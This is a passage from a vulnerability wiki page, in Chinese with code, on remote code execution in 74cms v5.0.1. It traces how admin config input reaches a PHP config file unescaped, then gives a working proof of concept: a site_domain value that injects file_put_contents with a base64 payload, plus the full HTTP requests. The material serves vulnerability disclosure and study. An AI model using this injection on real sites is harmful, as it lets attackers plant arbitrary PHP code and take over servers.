<span class="s2">            @unlink(RUNTIME_FILE);</span>
<span class="s2">            return true;</span>
<span class="s2">        } else {</span>
<span class="s2">            return false;</span>
<span class="s2">        }</span>
<span class="s2">    }</span>
<span class="s2">}</span>
</code></pre></div>

<p>multimerge($config, $new_config) in
/Application/Common/Common/function.php Line 938: no restricted</p>
<div class="codehilite"><pre><span></span><code>function multimerge($a, $b) {
    if (is_array($b) &amp;&amp; count($b)) {
        foreach ($b as $k =&gt; $v) {
            if (is_array($v) &amp;&amp; count($v)) {
                $a[$k] = in_array($k, array(&#39;SESSION_OPTIONS&#39;)) ? multimerge($a[$k], $v) : $v;
            } else {
                $a[$k] = $v;
            }
        }
    } else {
        $a = $b;
    }
    return $a;
}
</code></pre></div>

<p>CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.\'url.php\' -&gt;
/Application/Common/Conf/url.php</p>
<div class="codehilite"><pre><span></span><code>defined(&#39;COMMON_PATH&#39;)  or define(&#39;COMMON_PATH&#39;,    APP_PATH.&#39;Common/&#39;); // 应用公共目录
defined(&#39;CONF_PATH&#39;)    or define(&#39;CONF_PATH&#39;,      COMMON_PATH.&#39;Conf/&#39;);
define(&#39;APP_PATH&#39;,&#39;./Application/&#39;);
</code></pre></div>

<p>var_export(): Quote string with slashes&amp;Convert special characters to
HTML entities -&gt; stripslashes(): un-quotes a quoted string -&gt; Convert
special characters to HTML entities -&gt; write file</p>
<div class="codehilite"><pre><span></span><code><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">$config_file</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nx">\nreturn</span> <span class="s2">&quot; . stripslashes(var_export(</span><span class="si">$config</span><span class="s2">, true)) . &quot;</span><span class="p">;</span><span class="s2">&quot;,LOCK_</span>
</code></pre></div>

<p>/Application/Home/Conf/url.php: The code after \"return array(...);\"
does not work, so payload is site_domain=\', {your php code},\'</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span> 
<span class="k">return</span> <span class="k">array</span> <span class="p">(</span>
  <span class="s1">&#39;URL_MODEL&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s1">&#39;URL_HTML_SUFFIX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.html&#39;</span><span class="p">,</span>
  <span class="s1">&#39;URL_PATHINFO_DEPR&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
  <span class="s1">&#39;URL_ROUTER_ON&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
  <span class="s1">&#39;URL_ROUTE_RULES&#39;</span> <span class="o">=&gt;</span> 
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">&#39;/^jobfair\/(?!admin)(\w+)$/&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;jobfair/index/:1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;/^mall\/(?!admin)(\w+)$/&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mall/index/:1&#39;</span><span class="p">,</span>
  <span class="p">),</span>
  <span class="s1">&#39;QSCMS_VERSION&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;5.0.1&#39;</span><span class="p">,</span>
  <span class="s1">&#39;QSCMS_RELEASE&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;2019-03-19 00:00:00&#39;</span><span class="p">,</span>
  <span class="s1">&#39;SESSION_OPTIONS&#39;</span> <span class="o">=&gt;</span> 
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">&#39;domain&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.0.1&#39;</span><span class="p">,</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="mi">18</span><span class="p">,</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;D:\***\***\***\WWW\74cms\data\session&#39;</span><span class="p">,</span>
  <span class="p">),</span>
  <span class="s1">&#39;COOKIE_DOMAIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.0.1&#39;</span><span class="p">,</span>
  <span class="mi">0</span> <span class="o">=&gt;</span> <span class="mi">18</span><span class="p">,</span>
  <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="p">);</span>
</code></pre></div>

<h3 id="poc">复现poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<p>-&gt; PD9waHAgcGhwaW5mbygpOz8+</p>
<p>site_domain=\',
file_put_contents(\'403.php\',base64_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/74cms/index.php?m=Admin&amp;c=config&amp;a=edit</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">465</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default</span>

<span class="nt">site_name</span><span class="o">=</span><span class="s">%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F</span><span class="p">&amp;</span><span class="nt">site_domain</span><span class="o">=</span><span class="s">&#39;%2C+file_put_contents(&#39;403.php&#39;%2Cbase64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8%2B&#39;))%2C&#39;</span><span class="p">&amp;</span><span class="nt">site_dir</span><span class="o">=</span><span class="s">%2F74cms%2F</span><span class="p">&amp;</span><span class="nt">top_tel</span><span class="o">=</span><span class="s">000-00000000</span><span class="p">&amp;</span><span class="nt">bootom_tel</span><span class="o">=</span><span class="s">000-00000000</span><span class="p">&amp;</span><span class="nt">contact_email</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">address</span><span class="o">=</span><span class="s">00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC</span><span class="p">&amp;</span><span class="nt">bottom_other</span><span class="o">=</span><span class="s">Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+</span><span class="p">&amp;</span><span class="nt">icp</span><span class="o">=</span><span class="s">icp000000000</span><span class="p">&amp;</span><span class="nt">isclose</span><span class="o">=</span><span class="s">0</span><span class="p">&amp;</span><span class="nt">close_reason</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">statistics</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">logo_home</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">logo_other</span><span class="o">=</span>
<span class="s">GET /74cms/Application/Common/Conf/url.php HTTP/1.1</span>
<span class="s">Host: 127.0.0.1</span>
<span class="s">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span>
<span class="s">Accept: text/html,application/xhtml+xml,application/xml;q</span><span class="o">=</span><span class="s">0.9,*/*;q</span><span class="o">=</span><span class="s">0.8</span>
<span class="s">Accept-Language: zh-CN,zh;q</span><span class="o">=</span><span class="s">0.8,zh-TW;q</span><span class="o">=</span><span class="s">0.7,zh-HK;q</span><span class="o">=</span><span class="s">0.5,en-US;q</span><span class="o">=</span><span class="s">0.3,en;q</span><span class="o">=</span><span class="s">0.2</span>
<span class="s">Accept-Encoding: gzip, deflate</span>
<span class="s">Connection: close</span>
<span class="s">Cookie: PHPSESSID</span><span class="o">=</span><span class="s">arm0lvlbbfocml5vvac1tf3ph3; think_language</span><span class="o">=</span><span class="s">zh-CN; think_template</span><span class="o">=</span><span class="s">default</span>
<span class="s">Upgrade-Insecure-Requests: 1</span>
<span class="s">Cache-Control: max-age</span><span class="o">=</span><span class="s">0</span>
</code></pre></div>

<p>成功截图</p>
<p><img alt="" src="../resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId27.png" /></p>
<h2 id="_5">四、参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-link">
        74cms v6.0.4 反射型xss
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
        74cms v5.0.1 前台sql注入
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>